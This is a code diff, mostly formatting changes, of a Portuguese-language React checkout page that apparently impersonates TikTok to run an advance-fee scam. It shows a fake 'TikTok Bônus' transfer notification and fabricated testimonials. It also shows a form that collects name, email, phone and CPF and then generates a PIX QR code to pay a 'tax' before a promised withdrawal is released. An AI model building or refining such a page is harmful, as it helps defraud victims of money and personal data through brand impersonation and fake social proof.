@@ -19,66 +19,66 @@ const TAX = 32.71;
 const SALDO = TARGET_BALANCE;
 
 const testimonials = [
-  {
-    name: "Matheus Henrique Santos",
-    text: '"rapazz e nao foi que esse ngc do bônus deu boa aqui tbm familia KKKKKK"',
-    avatar: testimonialMatheus,
-  },
-  {
-    name: "Ana Paula Silva",
-    text: '"recebi em menos de 2 minutos, muito rápido! recomendo demais"',
-    avatar: testimonialAna,
-  },
-  {
-    name: "Carlos Eduardo",
-    text: '"pensei que era golpe mas recebi na hora, top demais!!"',
-    avatar: testimonialCarlos,
-  },
-];
+{
+  name: "Matheus Henrique Santos",
+  text: '"rapazz e nao foi que esse ngc do bônus deu boa aqui tbm familia KKKKKK"',
+  avatar: testimonialMatheus
+},
+{
+  name: "Ana Paula Silva",
+  text: '"recebi em menos de 2 minutos, muito rápido! recomendo demais"',
+  avatar: testimonialAna
+},
+{
+  name: "Carlos Eduardo",
+  text: '"pensei que era golpe mas recebi na hora, top demais!!"',
+  avatar: testimonialCarlos
+}];
+
 
 const PushNotification = ({
   show,
   exiting,
   isIOS,
-  onDismiss,
-}: {
-  show: boolean;
-  exiting: boolean;
-  isIOS: boolean;
-  onDismiss: () => void;
-}) => {
+  onDismiss
+
+
+
+
+
+}: {show: boolean;exiting: boolean;isIOS: boolean;onDismiss: () => void;}) => {
   if (!show) return null;
   return (
     <div
       className="fixed z-[9999] cursor-pointer"
       onClick={onDismiss}
       style={{
-        animation: exiting
-          ? "notifSlideUp 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards"
-          : "slideDown 0.4s cubic-bezier(0.16, 1, 0.3, 1)",
+        animation: exiting ?
+        "notifSlideUp 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards" :
+        "slideDown 0.4s cubic-bezier(0.16, 1, 0.3, 1)",
         top: isIOS ? "env(safe-area-inset-top, 0px)" : "12px",
         left: isIOS ? "6px" : "12px",
-        right: isIOS ? "6px" : "12px",
-      }}
-    >
-      {isIOS ? (
-        <img
-          src={notifIos}
-          alt="Transferência pendente"
-          className="w-full max-w-md mx-auto rounded-[22px]"
-          style={{ boxShadow: "0 10px 40px rgba(0,0,0,0.15)" }}
-          loading="eager"
-          decoding="async"
-        />
-      ) : (
-        <div
-          className="rounded-2xl p-4 mx-auto max-w-md"
-          style={{
-            fontFamily: "'Roboto', 'Google Sans', 'Noto Sans', sans-serif",
-            background: "#2a2a2e",
-            boxShadow: "0 6px 24px rgba(0,0,0,0.3)",
-          }}
-        >
+        right: isIOS ? "6px" : "12px"
+      }}>
+
+      {isIOS ?
+      <img
+        src={notifIos}
+        alt="Transferência pendente"
+        className="w-full max-w-md mx-auto rounded-[22px]"
+        style={{ boxShadow: "0 10px 40px rgba(0,0,0,0.15)" }}
+        loading="eager"
+        decoding="async" /> :
+
+
+      <div
+        className="rounded-2xl p-4 mx-auto max-w-md"
+        style={{
+          fontFamily: "'Roboto', 'Google Sans', 'Noto Sans', sans-serif",
+          background: "#2a2a2e",
+          boxShadow: "0 6px 24px rgba(0,0,0,0.3)"
+        }}>
+
           <div className="flex items-center gap-2 mb-2">
             <img src={tiktokRound} alt="TikTok" className="h-4 w-4 rounded-sm object-cover shrink-0" />
             <span className="text-[11px] text-white/50 font-medium">TikTok Bônus</span>
@@ -95,9 +95,9 @@ const PushNotification = ({
             <img src={tiktokRound} alt="TikTok" className="h-10 w-10 rounded-xl object-cover shrink-0 mt-0.5" />
           </div>
         </div>
-      )}
-    </div>
-  );
+      }
+    </div>);
+
 };
 
 const Pagamento = () => {
@@ -153,10 +153,10 @@ const Pagamento = () => {
             name: nomeCompleto.trim(),
             email: email.trim(),
             document,
-            phone,
+            phone
           },
-          ...(Object.keys(utms).length > 0 && { metadata: utms }),
-        },
+          ...(Object.keys(utms).length > 0 && { metadata: utms })
+        }
       });
 
       if (error) throw error;
@@ -165,7 +165,7 @@ const Pagamento = () => {
         setPixData({
           qr_code: data.qr_code,
           qr_code_base64: data.qr_code_base64,
-          transaction_id: data.transaction_id,
+          transaction_id: data.transaction_id
         });
         setShowNotification(true);
         setTimeout(() => setExitingNotification(true), 5000);
@@ -179,7 +179,7 @@ const Pagamento = () => {
       toast({
         title: "Erro no pagamento",
         description: err instanceof Error ? err.message : "Tente novamente em instantes.",
-        variant: "destructive",
+        variant: "destructive"
       });
     } finally {
       setLoading(false);
@@ -207,8 +207,8 @@ const Pagamento = () => {
         show={showNotification && !dismissNotification}
         exiting={exitingNotification}
         isIOS={isIOS}
-        onDismiss={handleDismissNotification}
-      />
+        onDismiss={handleDismissNotification} />
+
 
       {/* TikTok-style header */}
       <div style={{ background: "#161823" }} className="px-4 py-3 flex items-center justify-between">
@@ -289,11 +289,11 @@ const Pagamento = () => {
                 style={{
                   background: "#f5f5f5",
                   color: "#161823",
-                  border: "1.5px solid transparent",
+                  border: "1.5px solid transparent"
                 }}
-                onFocus={(e) => (e.target.style.borderColor = "#FE2C55")}
-                onBlur={(e) => (e.target.style.borderColor = "transparent")}
-              />
+                onFocus={(e) => e.target.style.borderColor = "#FE2C55"}
+                onBlur={(e) => e.target.style.borderColor = "transparent"} />
+
             </div>
             <div>
               <label className="text-[11px] font-semibold block mb-1.5" style={{ color: "#666" }}>NOME COMPLETO</label>
@@ -306,11 +306,11 @@ const Pagamento = () => {
                 style={{
                   background: "#f5f5f5",
                   color: "#161823",
-                  border: "1.5px solid transparent",
+                  border: "1.5px solid transparent"
                 }}
-                onFocus={(e) => (e.target.style.borderColor = "#FE2C55")}
-                onBlur={(e) => (e.target.style.borderColor = "transparent")}
-              />
+                onFocus={(e) => e.target.style.borderColor = "#FE2C55"}
+                onBlur={(e) => e.target.style.borderColor = "transparent"} />
+
             </div>
             <div>
               <label className="text-[11px] font-semibold block mb-1.5" style={{ color: "#666" }}>CPF</label>
@@ -320,10 +320,10 @@ const Pagamento = () => {
                 value={cpf}
                 onChange={(e) => {
                   const digits = e.target.value.replace(/\D/g, "").slice(0, 11);
-                  const formatted = digits
-                    .replace(/(\d{3})(\d)/, "$1.$2")
-                    .replace(/(\d{3})(\d)/, "$1.$2")
-                    .replace(/(\d{3})(\d{1,2})$/, "$1-$2");
+                  const formatted = digits.
+                  replace(/(\d{3})(\d)/, "$1.$2").
+                  replace(/(\d{3})(\d)/, "$1.$2").
+                  replace(/(\d{3})(\d{1,2})$/, "$1-$2");
                   setCpf(formatted);
                 }}
                 placeholder="000.000.000-00"
@@ -331,11 +331,11 @@ const Pagamento = () => {
                 style={{
                   background: "#f5f5f5",
                   color: "#161823",
-                  border: "1.5px solid transparent",
+                  border: "1.5px solid transparent"
                 }}
-                onFocus={(e) => (e.target.style.borderColor = "#FE2C55")}
-                onBlur={(e) => (e.target.style.borderColor = "transparent")}
-              />
+                onFocus={(e) => e.target.style.borderColor = "#FE2C55"}
+                onBlur={(e) => e.target.style.borderColor = "transparent"} />
+
             </div>
           </div>
         </div>
@@ -345,8 +345,8 @@ const Pagamento = () => {
           <p className="text-[13px] font-bold mb-3" style={{ color: "#161823" }}>Método de pagamento</p>
           <div
             className="flex items-center justify-between rounded-xl px-4 py-3"
-            style={{ background: "#f5f5f5", border: "1.5px solid #25F4EE" }}
-          >
+            style={{ background: "#f5f5f5", border: "1.5px solid #25F4EE" }}>
+
             <div className="flex items-center gap-3">
               <img src={pixLogo3} alt="Pix" className="h-6 w-6" loading="eager" decoding="async" />
               <div>
@@ -355,7 +355,7 @@ const Pagamento = () => {
               </div>
             </div>
             <div className="h-5 w-5 rounded-full flex items-center justify-center" style={{ background: "#25F4EE" }}>
-              <Check className="h-3 w-3" style={{ color: "#161823" }} />
+              
             </div>
           </div>
         </div>
@@ -366,30 +366,30 @@ const Pagamento = () => {
           disabled={!isFormValid || loading || !!pixData}
           className="w-full h-[52px] rounded-2xl text-[15px] font-bold text-white tracking-wide transition-all disabled:opacity-40"
           style={{
-            background: !isFormValid || loading || !!pixData
-              ? "#ccc"
-              : "linear-gradient(135deg, #FE2C55, #FF004F)",
-            boxShadow: isFormValid && !loading && !pixData
-              ? "0 4px 20px rgba(254, 44, 85, 0.4)"
-              : "none",
-          }}
-        >
-          {loading ? (
-            <span className="flex items-center justify-center gap-2">
+            background: !isFormValid || loading || !!pixData ?
+            "#ccc" :
+            "linear-gradient(135deg, #FE2C55, #FF004F)",
+            boxShadow: isFormValid && !loading && !pixData ?
+            "0 4px 20px rgba(254, 44, 85, 0.4)" :
+            "none"
+          }}>
+
+          {loading ?
+          <span className="flex items-center justify-center gap-2">
               <Loader2 className="h-5 w-5 animate-spin" /> Gerando PIX...
-            </span>
-          ) : pixData ? (
-            <span className="flex items-center justify-center gap-2">
+            </span> :
+          pixData ?
+          <span className="flex items-center justify-center gap-2">
               <CheckCircle2 className="h-5 w-5" /> PIX Gerado
-            </span>
-          ) : (
-            "Liberar Saque"
-          )}
+            </span> :
+
+          "Liberar Saque"
+          }
         </button>
 
         {/* QR Code result */}
-        {pixData && (
-          <div className="rounded-2xl p-5 text-center space-y-4" style={{ background: "#fff" }}>
+        {pixData &&
+        <div className="rounded-2xl p-5 text-center space-y-4" style={{ background: "#fff" }}>
             <div className="inline-flex items-center justify-center h-12 w-12 rounded-full mx-auto" style={{ background: "#E8FAF0" }}>
               <CheckCircle2 className="h-6 w-6" style={{ color: "#00C853" }} />
             </div>
@@ -400,45 +400,45 @@ const Pagamento = () => {
 
             <div className="flex justify-center p-4 rounded-xl" style={{ background: "#fafafa" }}>
               <QRCodeSVG
-                value={pixData.qr_code}
-                size={180}
-                level="M"
-                className="rounded-lg"
-              />
+              value={pixData.qr_code}
+              size={180}
+              level="M"
+              className="rounded-lg" />
+
             </div>
 
             <button
-              onClick={handleCopyPix}
-              className="w-full h-12 rounded-xl text-[13px] font-bold text-white transition-all flex items-center justify-center gap-2"
-              style={{ background: "#161823" }}
-            >
-              {copied ? (
-                <>
+            onClick={handleCopyPix}
+            className="w-full h-12 rounded-xl text-[13px] font-bold text-white transition-all flex items-center justify-center gap-2"
+            style={{ background: "#161823" }}>
+
+              {copied ?
+            <>
                   <Check className="h-4 w-4" style={{ color: "#25F4EE" }} /> Copiado!
-                </>
-              ) : (
-                <>
+                </> :
+
+            <>
                   <Copy className="h-4 w-4" /> Copiar Código PIX
                 </>
-              )}
+            }
             </button>
 
             <p className="text-[11px]" style={{ color: "#bbb" }}>
               Confirmação automática em até 2 minutos após pagamento.
             </p>
           </div>
-        )}
+        }
 
         {/* Testimonials */}
         <div className="pt-2">
           <p className="text-[12px] font-bold mb-3" style={{ color: "#161823" }}>O que estão dizendo</p>
           <div className="flex gap-3 overflow-x-auto pb-3 -mx-4 px-4" style={{ scrollSnapType: "x mandatory" }}>
-            {testimonials.map((t) => (
-              <div
-                key={t.name}
-                className="min-w-[240px] rounded-2xl p-3.5"
-                style={{ background: "#fff", scrollSnapAlign: "start" }}
-              >
+            {testimonials.map((t) =>
+            <div
+              key={t.name}
+              className="min-w-[240px] rounded-2xl p-3.5"
+              style={{ background: "#fff", scrollSnapAlign: "start" }}>
+
                 <div className="flex items-center gap-2.5 mb-2">
                   <div className="h-8 w-8 rounded-full overflow-hidden shrink-0">
                     <img src={t.avatar} alt={t.name} className="h-full w-full object-cover" loading="eager" decoding="async" />
@@ -446,15 +446,15 @@ const Pagamento = () => {
                   <div>
                     <p className="text-[12px] font-bold" style={{ color: "#161823" }}>{t.name}</p>
                     <div className="flex gap-0.5">
-                      {Array.from({ length: 5 }).map((_, i) => (
-                        <Star key={i} className="h-2.5 w-2.5 fill-yellow-400 text-yellow-400" />
-                      ))}
+                      {Array.from({ length: 5 }).map((_, i) =>
+                    <Star key={i} className="h-2.5 w-2.5 fill-yellow-400 text-yellow-400" />
+                    )}
                     </div>
                   </div>
                 </div>
                 <p className="text-[11px] leading-relaxed" style={{ color: "#666" }}>{t.text}</p>
               </div>
-            ))}
+            )}
           </div>
         </div>
 
@@ -462,8 +462,8 @@ const Pagamento = () => {
           Ao finalizar o pagamento você concorda com os termos de uso e privacidade do TikTok.
         </p>
       </div>
-    </div>
-  );
+    </div>);
+
 };
 
 export default Pagamento;
